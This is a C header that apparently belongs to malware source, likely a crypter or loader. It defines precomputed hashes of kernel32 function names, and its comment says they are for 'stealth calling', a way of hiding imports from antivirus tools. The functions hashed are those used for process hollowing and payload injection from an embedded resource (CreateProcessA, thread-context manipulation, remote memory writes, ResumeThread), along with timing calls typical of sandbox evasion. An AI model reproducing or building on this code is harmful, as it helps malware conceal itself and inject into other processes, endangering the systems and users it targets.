#define BLOCK_SIZE	8

/* Hashes of function names from kernel32 for stealth calling */

#define dwExitProcess 0x44e689b3
#define dwCreateProcessA 0xd646480e
#define dwGetProcAddress 0xf6c2d514
#define dwBeep 0xfa2c2f56
#define dwVirtualAlloc 0x7554284c
#define dwVirtualFree 0xf40d2543
#define dwVirtualAllocEx 0x1aff74a9
#define dwGetThreadContext 0x3be23af7
#define dwSetThreadContext 0xce600183
#define dwReadProcessMemory 0x10bff62e
#define dwWriteProcessMemory 0xcce9f53d
#define dwResumeThread 0xb13e4323
#define dwGetModuleFileNameA 0x717fadc2
#define dwLoadLibraryA 0x9ce809b0
#define dwFindResourceA 0x1e9b7d84
#define dwLoadResource 0x1a067202
#define dwLockResource 0x5182ab4b
#define dwSizeofResource 0x33a8c252
#define dwGetProcessHeap 0xede926f7
#define dwHeapAlloc 0x2c9433e3
#define dwHeapFree 0x091e99fa
#define dwFreeLibrary 0xbe6c2451
#define dwGetTickCount 0x7ed52f6e
#define dwSleep 0x40e99053
#define dwGetSystemInfo 0x65341f4b
#define dwVirtualAllocExNuma 0xc1b866da
#define dwCreateThread 0xbc310d06
